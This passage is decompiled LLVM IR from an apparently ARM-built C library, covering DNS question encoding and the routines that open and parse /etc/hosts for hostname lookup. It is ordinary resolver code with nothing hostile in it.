  %v2_1e7f0 = add i32 %tmp, 4
  %v3_1e7f0 = inttoptr i32 %v2_1e7f0 to i8*
  %v4_1e7f0 = load i8, i8* %v3_1e7f0, align 1
  %v5_1e7f0 = zext i8 %v4_1e7f0 to i32
  %v2_1e7f4 = add i32 %tmp, 5
  %v3_1e7f4 = inttoptr i32 %v2_1e7f4 to i8*
  %v4_1e7f4 = load i8, i8* %v3_1e7f4, align 1
  %v5_1e7f4 = zext i8 %v4_1e7f4 to i32
  %v4_1e7f8 = mul nuw nsw i32 %v5_1e7f0, 256
  %v5_1e7f8 = or i32 %v5_1e7f4, %v4_1e7f8
  %v2_1e7fc = add i32 %arg2, 32
  %v3_1e7fc = inttoptr i32 %v2_1e7fc to i32*
  store i32 %v5_1e7f8, i32* %v3_1e7fc, align 4
  %v2_1e800 = add i32 %tmp, 6
  %v3_1e800 = inttoptr i32 %v2_1e800 to i8*
  %v4_1e800 = load i8, i8* %v3_1e800, align 1
  %v5_1e800 = zext i8 %v4_1e800 to i32
  %v2_1e804 = add i32 %tmp, 7
  %v3_1e804 = inttoptr i32 %v2_1e804 to i8*
  %v4_1e804 = load i8, i8* %v3_1e804, align 1
  %v5_1e804 = zext i8 %v4_1e804 to i32
  %v4_1e808 = mul nuw nsw i32 %v5_1e800, 256
  %v5_1e808 = or i32 %v5_1e804, %v4_1e808
  %v2_1e80c = add i32 %arg2, 36
  %v3_1e80c = inttoptr i32 %v2_1e80c to i32*
  store i32 %v5_1e808, i32* %v3_1e80c, align 4
  %v2_1e810 = add i32 %tmp, 8
  %v3_1e810 = inttoptr i32 %v2_1e810 to i8*
  %v4_1e810 = load i8, i8* %v3_1e810, align 1
  %v5_1e810 = zext i8 %v4_1e810 to i32
  %v2_1e814 = add i32 %tmp, 9
  %v3_1e814 = inttoptr i32 %v2_1e814 to i8*
  %v4_1e814 = load i8, i8* %v3_1e814, align 1
  %v5_1e814 = zext i8 %v4_1e814 to i32
  %v4_1e818 = mul nuw nsw i32 %v5_1e810, 256
  %v5_1e818 = or i32 %v5_1e814, %v4_1e818
  %v2_1e81c = add i32 %arg2, 40
  %v3_1e81c = inttoptr i32 %v2_1e81c to i32*
  store i32 %v5_1e818, i32* %v3_1e81c, align 4
  %v2_1e820 = add i32 %tmp, 11
  %v3_1e820 = inttoptr i32 %v2_1e820 to i8*
  %v4_1e820 = load i8, i8* %v3_1e820, align 1
  %v5_1e820 = zext i8 %v4_1e820 to i32
  %v2_1e824 = add i32 %tmp, 10
  %v3_1e824 = inttoptr i32 %v2_1e824 to i8*
  %v4_1e824 = load i8, i8* %v3_1e824, align 1
  %v5_1e824 = zext i8 %v4_1e824 to i32
  %v4_1e828 = mul nuw nsw i32 %v5_1e824, 256
  %v5_1e828 = or i32 %v4_1e828, %v5_1e820
  %v2_1e82c = add i32 %arg2, 44
  %v3_1e82c = inttoptr i32 %v2_1e82c to i32*
  store i32 %v5_1e828, i32* %v3_1e82c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 44, { 15, 16, 0, 21, 22, 2, 17, 13, 42, 18, 19, 1, 20, 3, 26, 27, 28, 29, 30, 31, 23, 24, 25, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 4, 5, 6, 7, 8, 9, 10, 11, 14, 12 }
  uselistorder i32 11, { 14, 15, 7, 8, 16, 9, 10, 11, 24, 17, 4, 5, 6, 18, 19, 20, 21, 22, 23, 0, 12, 3, 2, 1, 13 }
  uselistorder i32 40, { 17, 18, 21, 1, 4, 22, 19, 5, 23, 2, 20, 6, 7, 8, 9, 10, 3, 12, 13, 11, 14, 0, 24, 25, 26, 27, 28, 15, 16 }
  uselistorder i32 36, { 42, 43, 46, 47, 48, 49, 6, 44, 7, 39, 8, 40, 9, 10, 0, 1, 11, 2, 4, 45, 12, 14, 18, 15, 19, 16, 20, 17, 21, 29, 30, 28, 31, 32, 33, 34, 35, 36, 23, 24, 25, 26, 22, 27, 13, 37, 3, 50, 51, 5, 41, 38 }
  uselistorder i32 7, { 17, 18, 12, 0, 1, 9, 10, 2, 22, 19, 20, 21, 3, 4, 5, 13, 14, 6, 15, 7, 11, 8, 16 }
  uselistorder i32 28, { 59, 10, 12, 62, 11, 65, 66, 71, 73, 74, 13, 6, 15, 14, 72, 16, 17, 67, 0, 75, 60, 61, 50, 18, 51, 19, 86, 20, 63, 64, 21, 58, 76, 22, 1, 68, 69, 23, 24, 25, 27, 26, 28, 2, 29, 77, 30, 70, 31, 32, 33, 34, 35, 36, 37, 3, 38, 39, 40, 7, 41, 4, 78, 79, 80, 81, 82, 83, 84, 85, 5, 52, 53, 54, 8, 9, 55, 46, 45, 43, 44, 49, 47, 48, 56, 42, 57 }
  uselistorder i8 2, { 1, 2, 3, 4, 7, 5, 8, 6, 0, 10, 9 }
  uselistorder i8 4, { 2, 0, 1, 3 }
  uselistorder i8 16, { 1, 2, 0, 3 }
  uselistorder i8 8, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1e834 = load i32, i32* @r4, align 4
  store i32 %v3_1e834, i32* %stack_var_-16, align 4
  %v9_1e834 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1e83c = load i32, i32* %arg1, align 4
  store i32 %v2_1e83c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_1e848 = inttoptr i32 %v2_1e83c to i8*
  %v2_1e848 = call i32 @__encode_dotted(i8* %v1_1e848)
  store i32 %v2_1e848, i32* %r0.global-to-local, align 4
  %v1_1e84c = icmp slt i32 %v2_1e848, 0
  br i1 %v1_1e84c, label %dec_label_pc_1e88c, label %dec_label_pc_1e854

dec_label_pc_1e854:                               ; preds = %entry
  %v1_1e854 = load i32, i32* @r5, align 4
  %v2_1e854 = sub i32 %v1_1e854, %v2_1e848
  %v7_1e85c = icmp slt i32 %v2_1e854, 4
  br i1 %v7_1e85c, label %bb, label %dec_label_pc_1e864

bb:                                               ; preds = %dec_label_pc_1e854
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e88c

dec_label_pc_1e864:                               ; preds = %dec_label_pc_1e854
  %v0_1e864 = load i32, i32* @r4, align 4
  %v1_1e864 = add i32 %v0_1e864, 5
  %v2_1e864 = inttoptr i32 %v1_1e864 to i8*
  %v3_1e864 = load i8, i8* %v2_1e864, align 1
  %v2_1e868 = load i32, i32* @r6, align 4
  %v4_1e868 = add i32 %v2_1e868, %v2_1e848
  %v5_1e868 = inttoptr i32 %v4_1e868 to i8*
  store i8 %v3_1e864, i8* %v5_1e868, align 1
  %v0_1e86c = load i32, i32* @r4, align 4
  %v1_1e86c = add i32 %v0_1e86c, 4
  %v2_1e86c = inttoptr i32 %v1_1e86c to i32*
  %v3_1e86c = load i32, i32* %v2_1e86c, align 4
  %v0_1e870 = load i32, i32* @r6, align 4
  %v1_1e870 = load i32, i32* %r0.global-to-local, align 4
  %v2_1e870 = add i32 %v1_1e870, %v0_1e870
  store i32 %v2_1e870, i32* %r2.global-to-local, align 4
  %v1_1e874 = trunc i32 %v3_1e86c to i8
  %v3_1e874 = add i32 %v2_1e870, 1
  %v4_1e874 = inttoptr i32 %v3_1e874 to i8*
  store i8 %v1_1e874, i8* %v4_1e874, align 1
  %v0_1e878 = load i32, i32* @r4, align 4
  %v1_1e878 = add i32 %v0_1e878, 9
  %v2_1e878 = inttoptr i32 %v1_1e878 to i8*
  %v3_1e878 = load i8, i8* %v2_1e878, align 1
  %v2_1e87c = load i32, i32* %r2.global-to-local, align 4
  %v3_1e87c = add i32 %v2_1e87c, 2
  %v4_1e87c = inttoptr i32 %v3_1e87c to i8*
  store i8 %v3_1e878, i8* %v4_1e87c, align 1
  %v0_1e880 = load i32, i32* @r4, align 4
  %v1_1e880 = add i32 %v0_1e880, 8
  %v2_1e880 = inttoptr i32 %v1_1e880 to i32*
  %v3_1e880 = load i32, i32* %v2_1e880, align 4
  %v1_1e884 = trunc i32 %v3_1e880 to i8
  %v2_1e884 = load i32, i32* %r2.global-to-local, align 4
  %v3_1e884 = add i32 %v2_1e884, 3
  %v4_1e884 = inttoptr i32 %v3_1e884 to i8*
  store i8 %v1_1e884, i8* %v4_1e884, align 1
  %v0_1e888 = load i32, i32* %r0.global-to-local, align 4
  %v1_1e888 = add i32 %v0_1e888, 4
  store i32 %v1_1e888, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e88c

dec_label_pc_1e88c:                               ; preds = %bb, %entry, %dec_label_pc_1e864
  %v1_1e890 = phi i32 [ -1, %bb ], [ %v2_1e848, %entry ], [ %v1_1e888, %dec_label_pc_1e864 ]
  %v2_1e88c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1e88c, i32* @r4, align 4
  store i32 %v9_1e834, i32* @r6, align 4
  ret i32 %v1_1e890

; uselistorder directives
  uselistorder i32 %v2_1e848, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 9, { 29, 30, 31, 34, 35, 17, 33, 32, 28, 23, 24, 18, 36, 1, 37, 38, 19, 20, 25, 39, 40, 41, 42, 21, 22, 0, 16, 13, 14, 15, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 26, 27 }
  uselistorder i32 5, { 22, 23, 24, 9, 18, 0, 10, 25, 11, 5, 19, 12, 20, 14, 13, 6, 29, 1, 7, 26, 8, 2, 27, 28, 15, 3, 4, 16, 17, 21 }
  uselistorder label %dec_label_pc_1e88c, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33264), i32* @r0, align 4
  %v1_1e8ac = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33264))
  ret i32 %v1_1e8ac

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_1e8c4 = load i32, i32* @r4, align 4
  %v6_1e8c4 = load i32, i32* @r5, align 4
  %v9_1e8c4 = load i32, i32* @r6, align 4
  %v12_1e8c4 = load i32, i32* @r7, align 4
  %v15_1e8c4 = load i32, i32* @r8, align 4
  %v18_1e8c4 = load i32, i32* @sb, align 4
  %v21_1e8c4 = load i32, i32* @sl, align 4
  %v24_1e8c4 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r4, align 4
  %v2_1e8ec = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_1e8ec, align 4
  %v0_1e8f0 = load i32, i32* @r0, align 4
  store i32 %v0_1e8f0, i32* @r6, align 4
  %v0_1e8f4 = load i32, i32* @r1, align 4
  %v0_1e8f8 = load i32, i32* @r2, align 4
  store i32 %v0_1e8f8, i32* @r8, align 4
  %v0_1e8fc = load i32, i32* @r3, align 4
  store i32 %v0_1e8fc, i32* @fp, align 4
  %v3_1e900 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1e900, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_1e90c

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_1eaac

dec_label_pc_1e90c:                               ; preds = %entry
  %v2_1e90c = icmp eq i32 %v0_1e8f0, 0
  br i1 %v2_1e90c, label %dec_label_pc_1e914, label %dec_label_pc_1e934

dec_label_pc_1e914:                               ; preds = %dec_label_pc_1e90c
  %v0_1e914 = call i32 @__open_etc_hosts()
  store i32 %v0_1e914, i32* @r6, align 4
  %v2_1e918 = icmp eq i32 %v0_1e914, 0
  br i1 %v2_1e918, label %dec_label_pc_1e920, label %dec_label_pc_1e934

dec_label_pc_1e920:                               ; preds = %dec_label_pc_1e914
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  %v2_1e924 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_1e924, align 4
  %v0_1e928 = call i32 @__GI___errno_location()
  %v1_1e92c = inttoptr i32 %v0_1e928 to i32*
  %v2_1e92c = load i32, i32* %v1_1e92c, align 4
  store i32 %v2_1e92c, i32* @sb, align 4
  br label %dec_label_pc_1eaac

dec_label_pc_1e934:                               ; preds = %dec_label_pc_1e914, %dec_label_pc_1e90c
  %v1_1e954 = phi i32 [ %v0_1e914, %dec_label_pc_1e914 ], [ %v0_1e8f0, %dec_label_pc_1e90c ]
  %v0_1e938 = load i32, i32* @r4, align 4
  %v2_1e938 = add i32 %v0_1e938, -33252
  store i32 %v2_1e938, i32* @r4, align 4
  %v2_1e93c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_1e954 = add i32 %v1_1e954, 8
  %v3_1e954 = inttoptr i32 %v2_1e954 to i32*
  store i32 48, i32* %v3_1e954, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_1e95c = load i32, i32* @r5, align 4
  %v1_1e95c = add i32 %v0_1e95c, -48
  store i32 %v1_1e95c, i32* %r1.global-to-local, align 4
  %v0_1e960 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e960 = add i32 %v0_1e960, 24
  store i32 %v1_1e960, i32* @ip, align 4
  %v0_1e964 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1e964, i32* @sb, align 4
  %v0_1e968 = load i32, i32* @lr, align 4
  %v1_1e968 = add i32 %v0_1e968, 32
  store i32 %v1_1e968, i32* @sl, align 4
  %v1_1e96c = load i32, i32* @r6, align 4
  %v2_1e96c = add i32 %v1_1e96c, 16
  %v3_1e96c = inttoptr i32 %v2_1e96c to i32*
  store i32 %v1_1e95c, i32* %v3_1e96c, align 4
  %v0_1e970 = load i32, i32* @r4, align 4
  %v0_1e974 = load i32, i32* @ip, align 4
  store i32 %v0_1e974, i32* %stack_var_-64, align 4
  %v0_1e978 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e978 = load i32, i32* %r3.global-to-local, align 4
  %v2_1e978 = inttoptr i32 %v1_1e978 to i32*
  store i32 %v0_1e978, i32* %v2_1e978, align 4
  %v0_1e97c = load i32, i32* @lr, align 4
  %v1_1e97c = load i32, i32* @r6, align 4
  %v2_1e97c = add i32 %v1_1e97c, 4
  %v3_1e97c = inttoptr i32 %v2_1e97c to i32*
  store i32 %v0_1e97c, i32* %v3_1e97c, align 4
  %v2_1e9ac = inttoptr i32 %v0_1e8f4 to i8*
  br label %dec_label_pc_1ea80

dec_label_pc_1e984:                               ; preds = %dec_label_pc_1ea80
  %v3_1e984 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1e984, i32* %r1.global-to-local, align 4
  %v0_1e988 = load i32, i32* @fp, align 4
  %v7_1e988 = icmp eq i32 %v0_1e988, 1
  %v1_1e98c = add i32 %v3_1e984, 4
  store i32 %v1_1e98c, i32* @r5, align 4
  %v1_1e990 = load i32, i32* @r7, align 4
  %v2_1e990 = add i32 %v1_1e990, 4
  %v3_1e990 = inttoptr i32 %v2_1e990 to i32*
  store i32 %v1_1e98c, i32* %v3_1e990, align 4
  br i1 %v7_1e988, label %dec_label_pc_1eaac, label %dec_label_pc_1e998

dec_label_pc_1e998:                               ; preds = %dec_label_pc_1e984
  %v0_1e998 = load i32, i32* @fp, align 4
  %v7_1e998 = icmp eq i32 %v0_1e998, 2
  br i1 %v7_1e998, label %dec_label_pc_1e9a4, label %dec_label_pc_1e9c8.preheader

dec_label_pc_1e9c8.preheader:                     ; preds = %dec_label_pc_1e998
  %v1_1e99c = load i32, i32* @r5, align 4
  %v1_1e9c825 = inttoptr i32 %v1_1e99c to i32*
  %v2_1e9c826 = load i32, i32* %v1_1e9c825, align 4
  store i32 %v2_1e9c826, i32* %r3.global-to-local, align 4
  store i32 %v2_1e9c826, i32* %r1.global-to-local, align 4
  %v2_1e9cc28 = icmp eq i32 %v2_1e9c826, 0
  %v1_1e9d429 = add i32 %v1_1e99c, 4
  store i32 %v1_1e9d429, i32* @r4, align 4
  br i1 %v2_1e9cc28, label %dec_label_pc_1ea80, label %dec_label_pc_1e9bc

dec_label_pc_1e9a4:                               ; preds = %dec_label_pc_1e998
  %v0_1e9a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1e9a4 = inttoptr i32 %v0_1e9a4 to i32*
  %v2_1e9a4 = load i32, i32* %v1_1e9a4, align 4
  store i32 %v2_1e9a4, i32* @r1, align 4
  %v3_1e9ac = call i32 @__GI_strcoll(i8* %v2_1e9ac, i32 %v2_1e9a4)
  %v2_1e9b0 = icmp eq i32 %v3_1e9ac, 0
  br i1 %v2_1e9b0, label %dec_label_pc_1e9e0, label %dec_label_pc_1ea80

dec_label_pc_1e9bc:                               ; preds = %dec_label_pc_1e9c8.preheader, %dec_label_pc_1e9bc.dec_label_pc_1e9c8_crit_edge
  %v2_1e9c830 = phi i32 [ %v2_1e9c8, %dec_label_pc_1e9bc.dec_label_pc_1e9c8_crit_edge ], [ %v2_1e9c826, %dec_label_pc_1e9c8.preheader ]
  %v3_1e9bc = call i32 @__GI_strcasecmp(i8* %v2_1e9ac, i32 %v2_1e9c830)
  %v2_1e9c0 = icmp eq i32 %v3_1e9bc, 0
  br i1 %v2_1e9c0, label %dec_label_pc_1e9e0, label %dec_label_pc_1e9bc.dec_label_pc_1e9c8_crit_edge

dec_label_pc_1e9bc.dec_label_pc_1e9c8_crit_edge:  ; preds = %dec_label_pc_1e9bc
  %v0_1e9c8.pre = load i32, i32* @r4, align 4
  %v1_1e9c8 = inttoptr i32 %v0_1e9c8.pre to i32*
  %v2_1e9c8 = load i32, i32* %v1_1e9c8, align 4
  store i32 %v2_1e9c8, i32* %r3.global-to-local, align 4
  store i32 %v2_1e9c8, i32* %r1.global-to-local, align 4
  %v2_1e9cc = icmp eq i32 %v2_1e9c8, 0
  %v1_1e9d4 = add i32 %v0_1e9c8.pre, 4
  store i32 %v1_1e9d4, i32* @r4, align 4
  br i1 %v2_1e9cc, label %dec_label_pc_1ea80, label %dec_label_pc_1e9bc

dec_label_pc_1e9e0:                               ; preds = %dec_label_pc_1e9bc, %dec_label_pc_1e9a4
  %v0_1e9e0 = load i32, i32* @r5, align 4
  %v1_1e9e0 = inttoptr i32 %v0_1e9e0 to i32*
  %v2_1e9e0 = load i32, i32* %v1_1e9e0, align 4
  store i32 %v2_1e9e0, i32* %r3.global-to-local, align 4
  %v4_1e9e0 = add i32 %v0_1e9e0, 4
  store i32 %v4_1e9e0, i32* @r5, align 4
  %v2_1e9e4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1e9e4, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_1e9ec = load i32, i32* @r7, align 4
  %v2_1e9ec = inttoptr i32 %v1_1e9ec to i32*
  store i32 %v2_1e9e0, i32* %v2_1e9ec, align 4
  %v0_1e9f0 = load i32, i32* @lr, align 4
  %v1_1e9f0 = load i32, i32* @ip, align 4
  %v2_1e9f0 = add i32 %v1_1e9f0, 4
  %v3_1e9f0 = inttoptr i32 %v2_1e9f0 to i32*
  store i32 %v0_1e9f0, i32* %v3_1e9f0, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_1e9f8 = load i32, i32* @r8, align 4
  %v7_1e9f8 = icmp eq i32 %v0_1e9f8, 2
  %v0_1e9fc = load i32, i32* @r5, align 4
  %v1_1e9fc = load i32, i32* @r7, align 4
  %v2_1e9fc = add i32 %v1_1e9fc, 4
  %v3_1e9fc = inttoptr i32 %v2_1e9fc to i32*
  store i32 %v0_1e9fc, i32* %v3_1e9fc, align 4
  %v0_1ea00 = load i32, i32* @ip, align 4
  %v1_1ea00 = load i32, i32* @r7, align 4
  %v2_1ea00 = add i32 %v1_1ea00, 16
  %v3_1ea00 = inttoptr i32 %v2_1ea00 to i32*
  store i32 %v0_1ea00, i32* %v3_1ea00, align 4
  %v0_1ea04 = load i32, i32* @sl, align 4
  %v1_1ea04 = load i32, i32* %r2.global-to-local, align 4
  %v2_1ea04 = add i32 %v1_1ea04, 24
  %v3_1ea04 = inttoptr i32 %v2_1ea04 to i32*
  store i32 %v0_1ea04, i32* %v3_1ea04, align 4
  br i1 %v7_1e9f8, label %dec_label_pc_1ea0c, label %dec_label_pc_1ea3c

dec_label_pc_1ea0c:                               ; preds = %dec_label_pc_1e9e0
  %v3_1ea0c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1ea0c, i32* %r3.global-to-local, align 4
  %v0_1ea10 = load i32, i32* @r8, align 4
  %v1_1ea14 = inttoptr i32 %v3_1ea0c to i32*
  %v2_1ea14 = load i32, i32* %v1_1ea14, align 4
  store i32 %v2_1ea14, i32* %r1.global-to-local, align 4
  %v0_1ea18 = load i32, i32* @sl, align 4
  store i32 %v0_1ea18, i32* %r2.global-to-local, align 4
  %v3_1ea1c = inttoptr i32 %v2_1ea14 to i8*
  %v4_1ea1c = call i32 @inet_pton(i32 %v0_1ea10, i8* %v3_1ea1c, i32 %v0_1ea18)
  %tmp23 = icmp slt i32 %v4_1ea1c, 1
  br i1 %tmp23, label %dec_label_pc_1ea7c, label %dec_label_pc_1ea28

dec_label_pc_1ea28:                               ; preds = %dec_label_pc_1ea0c
  %v0_1ea2c = load i32, i32* @r7, align 4
  %v2_1ea2c = inttoptr i32 %tmp7 to i32*
  store i32 %v0_1ea2c, i32* %v2_1ea2c, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1ea34 = load i32, i32* @r8, align 4
  %v1_1ea34 = load i32, i32* @r7, align 4
  %v2_1ea34 = add i32 %v1_1ea34, 8
  %v3_1ea34 = inttoptr i32 %v2_1ea34 to i32*
  store i32 %v0_1ea34, i32* %v3_1ea34, align 4
  %v0_1ea74.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ea70

dec_label_pc_1ea3c:                               ; preds = %dec_label_pc_1e9e0
  %v0_1ea3c = load i32, i32* @r8, align 4
  %v7_1ea3c = icmp eq i32 %v0_1ea3c, 10
  br i1 %v7_1ea3c, label %dec_label_pc_1ea44, label %dec_label_pc_1ea7c

dec_label_pc_1ea44:                               ; preds = %dec_label_pc_1ea3c
  %v3_1ea44 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1ea44, i32* %r3.global-to-local, align 4
  %v1_1ea4c = inttoptr i32 %v3_1ea44 to i32*
  %v2_1ea4c = load i32, i32* %v1_1ea4c, align 4
  store i32 %v2_1ea4c, i32* %r1.global-to-local, align 4
  %v0_1ea50 = load i32, i32* @sl, align 4
  store i32 %v0_1ea50, i32* %r2.global-to-local, align 4
  %v3_1ea54 = inttoptr i32 %v2_1ea4c to i8*
  %v4_1ea54 = call i32 @inet_pton(i32 10, i8* %v3_1ea54, i32 %v0_1ea50)
  %tmp24 = icmp slt i32 %v4_1ea54, 1
  br i1 %tmp24, label %dec_label_pc_1ea7c, label %dec_label_pc_1ea60

dec_label_pc_1ea60:                               ; preds = %dec_label_pc_1ea44
  store i32 %tmp7, i32* @ip, align 4
  %v0_1ea64 = load i32, i32* @r8, align 4
  %v1_1ea64 = load i32, i32* @r7, align 4
  %v2_1ea64 = add i32 %v1_1ea64, 8
  %v3_1ea64 = inttoptr i32 %v2_1ea64 to i32*
  store i32 %v0_1ea64, i32* %v3_1ea64, align 4
  %v0_1ea68 = load i32, i32* @r7, align 4
  %v1_1ea68 = load i32, i32* @ip, align 4
  %v2_1ea68 = inttoptr i32 %v1_1ea68 to i32*
  store i32 %v0_1ea68, i32* %v2_1ea68, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ea70

dec_label_pc_1ea70:                               ; preds = %dec_label_pc_1ea28, %dec_label_pc_1ea60
  %v0_1ea74 = phi i32 [ %v0_1ea74.pre, %dec_label_pc_1ea28 ], [ 16, %dec_label_pc_1ea60 ]
  store i32 0, i32* @sb, align 4
  %v1_1ea74 = load i32, i32* @r7, align 4
  %v2_1ea74 = add i32 %v1_1ea74, 12
  %v3_1ea74 = inttoptr i32 %v2_1ea74 to i32*
  store i32 %v0_1ea74, i32* %v3_1ea74, align 4
  br label %dec_label_pc_1eaa4

dec_label_pc_1ea7c:                               ; preds = %dec_label_pc_1ea3c, %dec_label_pc_1ea44, %dec_label_pc_1ea0c
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_1ea80

dec_label_pc_1ea80:                               ; preds = %dec_label_pc_1e9c8.preheader, %dec_label_pc_1e9bc.dec_label_pc_1e9c8_crit_edge, %dec_label_pc_1e9a4, %dec_label_pc_1ea7c, %dec_label_pc_1e934
  %v0_1ea80 = load i32, i32* @r6, align 4
  store i32 %v2_1e93c, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_1e970, i32* %r3.global-to-local, align 4
  %v4_1ea90 = inttoptr i32 %v0_1ea80 to i32*
  %v5_1ea90 = call i32 @__GI_config_read(i32* %v4_1ea90, i32 %v2_1e93c, i32 459270, i32 %v0_1e970)
  %v2_1ea94 = icmp eq i32 %v5_1ea90, 0
  br i1 %v2_1ea94, label %dec_label_pc_1ea9c, label %dec_label_pc_1e984

dec_label_pc_1ea9c:                               ; preds = %dec_label_pc_1ea80
  %v0_1ea9c = load i32, i32* @fp, align 4
  %v7_1ea9c = icmp eq i32 %v0_1ea9c, 1
  br i1 %v7_1ea9c, label %dec_label_pc_1eaac, label %dec_label_pc_1eaa4

dec_label_pc_1eaa4:                               ; preds = %dec_label_pc_1ea9c, %dec_label_pc_1ea70
  %v0_1eaa4 = load i32, i32* @r6, align 4
  %v1_1eaa8 = inttoptr i32 %v0_1eaa4 to i32*
  %v2_1eaa8 = call i32 @__GI_config_close(i32* %v1_1eaa8)
  br label %dec_label_pc_1eaac

dec_label_pc_1eaac:                               ; preds = %dec_label_pc_1e984, %.thread, %dec_label_pc_1ea9c, %dec_label_pc_1e920, %dec_label_pc_1eaa4
  %v0_1eaac = load i32, i32* @sb, align 4
  store i32 %v3_1e8c4, i32* @r4, align 4
  store i32 %v6_1e8c4, i32* @r5, align 4
  store i32 %v9_1e8c4, i32* @r6, align 4
  store i32 %v12_1e8c4, i32* @r7, align 4
  store i32 %v15_1e8c4, i32* @r8, align 4
  store i32 %v18_1e8c4, i32* @sb, align 4
  store i32 %v21_1e8c4, i32* @sl, align 4
  store i32 %v24_1e8c4, i32* @fp, align 4
  ret i32 %v0_1eaac

; uselistorder directives
  uselistorder i32 %v2_1e9c8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1e9c8.pre, { 1, 0 }
  uselistorder i32 %v0_1e970, { 1, 0 }
  uselistorder i32 %v2_1e93c, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 0, 5, 7 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 10, { 3, 37, 39, 40, 12, 44, 47, 48, 49, 31, 32, 14, 13, 4, 51, 50, 41, 15, 52, 16, 53, 17, 54, 55, 1, 45, 46, 56, 18, 57, 19, 20, 21, 38, 8, 0, 42, 43, 22, 61, 58, 59, 23, 60, 25, 24, 33, 34, 7, 11, 10, 6, 9, 2, 35, 36, 26, 5, 28, 29, 27, 30, 62 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 26, 27, 28, 29, 30, 31, 32, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 24, { 28, 32, 34, 35, 0, 46, 47, 36, 37, 13, 14, 15, 16, 38, 39, 33, 48, 1, 43, 40, 41, 42, 29, 30, 49, 44, 11, 31, 17, 18, 19, 4, 12, 2, 50, 51, 52, 53, 54, 55, 56, 20, 45, 21, 22, 23, 24, 25, 26, 8, 9, 7, 10, 3, 5, 6, 27 }
